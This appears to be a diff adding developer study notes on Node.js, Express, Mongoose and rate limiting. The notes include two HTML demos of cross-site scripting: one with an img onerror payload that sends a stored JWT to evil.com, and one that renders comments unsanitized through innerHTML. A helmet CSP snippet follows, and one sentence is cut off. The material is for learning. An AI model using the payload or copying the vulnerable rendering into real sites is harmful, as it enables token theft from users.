@@ -1,0 +1,104 @@
+1.WHAT IS NODE JS AND EXPRESS JS 
+Node.js is a runtime that lets you run JavaScript on the server side.Node.js is a JavaScript runtime built on Chrome’s V8 engine.
+
+Express.js is a lightweight web framework built on top of Node.js that makes it easier to handle routing, middleware, and HTTP requests
+
+2.WHY EXPRESS OVER NODE 
+
+| Feature        | Node.js (Manual Work)      | Express.js (Built-In Power)           |
+| -------------- | -------------------------- | ------------------------------------- |
+| Routing        | Manual URL/method check    | Clean route methods (`.get`, `.post`) |
+| Middleware     | Manual body parsing        | `express.json()`, plugins             |
+| Scalability    | Hard to split logic        | Modular route files, `app.use()`      |
+
+3.MONGOOSE 
+
+mongoose is a third-party Node.js library.
+It’s installed via npm:
+npm install mongoose
+This library helps you connect to and work with MongoDB databases more easily.
+
+
+4.express-rate-limit is a middleware that limits how many requests a user can make in a given time window. It protects against brute-force attacks, DoS attacks, and API abuse by slowing down or blocking suspicious traffic.
+
+Base64 turns JSON into a compact ASCII string that
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Vulnerable JWT Example</title>
+</head>
+<body>
+  <h1>Welcome to DevDoc</h1>
+
+  <!-- This div will display unescaped user input (vulnerable) -->
+  <div id="output"></div>
+
+  <script>
+    // Simulate a token stored in localStorage after login
+    localStorage.setItem('jwt', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...');
+
+    // Simulated untrusted user input (e.g. from backend API)
+    const maliciousComment = `<img src="x" onerror="fetch('https://evil.com/steal?token=' + localStorage.getItem('jwt'))">`;
+
+    // ❌ Dangerous: innerHTML renders the attacker's payload
+    document.getElementById('output').innerHTML = maliciousComment;
+  </script>
+</body>
+</html>
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>XSS Demo</title>
+  </head>
+  <body>
+    <h1>Post a comment</h1>
+
+    <!-- Form to post a comment -->
+    <form id="commentForm">
+      <input type="text" id="commentInput" placeholder="Write comment" />
+      <button type="submit">Submit</button>
+    </form>
+
+    <h2>Comments</h2>
+    <div id="comments"></div>
+
+    <script>
+      // Simulate JWT after login
+      localStorage.setItem("jwt", "FAKE.JWT.TOKEN");
+
+      // 🧪 Simulate DB: Local array to store comments
+      const comments = [];
+
+      const form = document.getElementById("commentForm");
+      const input = document.getElementById("commentInput");
+      const commentsDiv = document.getElementById("comments");
+
+      form.addEventListener("submit", (e) => {
+        e.preventDefault();
+        const comment = input.value;
+        comments.push(comment);
+        input.value = "";
+
+        // 🚨 VULNERABLE: Rendering unsanitized user input
+        renderComments();
+      });
+
+      function renderComments() {
+        commentsDiv.innerHTML = comments
+          .map((c) => `<p>${c}</p>`)
+          .join("");
+      }
+    </script>
+  </body>
+</html>
+app.use(helmet({
+  contentSecurityPolicy: {
+    directives: {
+      defaultSrc: ["'self'"],
+      scriptSrc: ["'self'"]
+    }
+  }
+}));
